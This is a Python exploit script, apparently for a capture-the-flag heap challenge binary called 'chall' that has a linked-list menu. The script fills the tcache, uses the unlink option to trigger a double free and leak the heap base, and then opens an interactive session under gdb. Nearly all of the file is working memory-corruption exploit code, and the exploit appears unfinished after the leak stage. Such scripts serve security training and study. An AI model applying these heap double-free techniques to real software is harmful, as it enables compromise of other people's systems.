#!/usr/bin/python3
from rootkit import *

def add(size, data):
	p.recvuntil(b'Choice')
	p.sendline(b'1')
	p.recvuntil(b"length")
	p.sendline(size)
	p.recvuntil(b"data")
	p.sendline(data)

def link(node1, node2):
	p.recvuntil(b'Choice')
	p.sendline(b'3')
	p.recvuntil(b"index")
	p.sendline(node1)
	p.recvuntil(b"index")
	p.sendline(node2)

def unlink(index, offset, keep):
	p.recvuntil(b'Choice')
	p.sendline(b'4')
	p.recvuntil(b"index")
	p.sendline(index)
	p.recvuntil(b"Enter offset")
	p.sendline(offset)
	p.recvuntil(b'keep')
	p.sendline(keep)

def remove(index, offset):
	p.recvuntil(b'Choice')
	p.sendline(b'2')
	p.recvuntil(b"index")
	p.sendline(index)
	p.recvuntil(b"Which")
	p.sendline(offset)

local_bin = "./chall"
elf = ELF(local_bin)
rop = ROP(elf)

p = gdb.debug(local_bin, '''
	#b *0x555555555746	
	# b *0x55555555595E
	# b *0x555555555CE5
	#b *0x555555555AAC
	continue
	''')


add(b'24', b'z' * 0x18)	# node 0
add(b'24', b'z' * 0x18)	# node 1
add(b'24', b'z' * 0x18)	# node 2
add(b'24', b'z' * 0x18)	# node 3
add(b'24', b'z' * 0x18)	# node 4

add(b'24', b'a' * 0x18)	# node 5
add(b'24', b'b' * 0x18)	# node 6
add(b'24', b'c' * 0x18)	# node 7

remove(b'0', b'1337')			#this will fill the tcache
remove(b'1', b'1337')
remove(b'2', b'1337')
remove(b'3', b'1337')

#p.interactive()
#### tcachebins filled

#add(b'24', b'a' * 0x18)	# node 0
#add(b'24', b'b' * 0x18)	# node 1
#add(b'24', b'c' * 0x18)	# node 1

link(b'5', b'6')
link(b'5', b'7')

# unlink node b, will be written into node 1
unlink(b'5', b'2', b'y') 

# free all, remove node b and node c
#p.interactive()
remove(b'0', b'1337')	

# unlink node 4 and free it so that we avoid double free detection in fastbin
remove(b'4', b'1337')

print("[+] Now go to unlink and opt not to keep node eeeee will trigger a double free")
unlink(b'5', b'2', b'n')

add(b'24', b'z' * 0x18)	# node 0
add(b'24', b'y' * 0x18)	# node 1
add(b'24', b'w' * 0x18)	# node 2

print("[+] Add breakpoint malloc b *0x55555555559C ")

add(b'48', b'hellohellotesttest')	# node 3

add(b'24', 'a')		# node 4 have a pointer to the double free address

add(b'64', b'cccccccccccccccc')		# node 6

remove(b'6', b'1')

link(b'0', b'4')

print("[+] Now request to view 0 will see heap leak from 4")
p.sendlineafter("Choice >> ", "2")
p.sendlineafter("Enter index: ", "0")
p.recvuntil("Node 0 Offset 2 : aaaaaaaa")
heap_base = uu64(p.recvn(6))-0x10
p.sendlineafter("Which one?(1337 for all) ", "1")
log.info(f"heap base : {hex(heap_base)}")
p.interactive()